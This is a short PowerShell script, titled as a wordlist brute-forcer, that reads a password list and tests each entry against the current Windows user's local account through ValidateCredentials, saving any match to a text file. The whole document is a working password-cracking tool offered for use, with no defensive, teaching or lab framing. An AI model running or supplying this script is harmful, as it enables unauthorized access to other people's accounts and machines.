#Wordlist BruteForce
$Passlist=Read-Host Drag Your WordList Here
foreach($line in [System.IO.File]::ReadLines($Passlist))
{
       	$p=$line	
		$u = $env:USERNAME
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		$t = [DirectoryServices.AccountManagement.ContextType]::Machine
		$a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
		$final = $a.ValidateCredentials($u,$p)
		if($final -eq "True"){
		write-host Password Found: -foreground green $p 
		$p >> Password_Found.txt
		break
		}else{
		write-host Password In Cracking: -foreground Red $p
		continue
		}
}
